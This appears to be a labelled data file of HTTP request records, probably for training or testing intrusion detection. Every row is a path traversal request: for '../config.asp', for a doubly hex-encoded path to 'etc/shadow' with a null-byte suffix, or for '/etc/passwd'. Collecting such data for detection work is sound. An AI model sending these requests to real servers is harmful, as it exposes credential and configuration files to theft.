41,1,200,3850,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3586,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,6613,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,7082,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,2536,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,1769,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,2516,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,7609,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,2066,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,4683,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,6655,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,7001,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3707,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,1766,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,6783,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,1490,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3069,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,2899,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,7723,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,7058,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,5484,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3346,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,6310,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,4073,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3911,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,5422,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3157,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,2150,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3445,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3915,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,3290,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
41,1,200,1094,7,21,7,2,0,GET get-files?file=../config.asp HTTP/1.1
344,1,200,3154,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7318,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,4564,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1463,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1125,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7129,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1508,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7996,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2285,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,3060,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,3501,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2913,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,5868,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1435,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,4080,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2167,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1492,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,3204,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7619,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2712,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2923,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,4997,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,5091,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,5282,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,6474,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7213,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,3790,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1458,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,4170,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7659,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1424,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2768,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,1677,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,4088,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7992,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,6758,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7913,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2641,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,4715,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,2675,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7524,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,5374,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,7398,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,5730,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,6634,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
344,1,200,5947,7,12,4,1,0,GET get-files?file=3265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663265326532663635373436333266373336383631363436663737323533303330 HTTP/1.1
56,1,200,2095,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3562,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4699,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5024,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3954,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6232,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7159,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3091,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6641,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3854,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5519,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7704,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2064,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1045,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4553,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1066,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1036,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6525,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6669,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2468,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2868,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3261,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7780,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1579,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6652,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4739,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4093,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7544,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5426,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1242,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5061,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6970,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6228,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5272,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1382,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7354,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2990,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3164,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5666,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7706,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6806,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6742,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2652,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2740,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,6415,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3242,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4591,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1874,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7641,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4579,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3808,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2385,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3397,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1400,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1618,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3663,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1452,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7863,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3738,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7838,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2904,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,2415,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4275,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4301,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4555,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3096,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5345,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,7437,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3487,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,4983,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,1569,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,3035,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
56,1,200,5215,7,9,23,13,0,GET ../../../../../../../../../../../etc/passwd HTTP/1.1
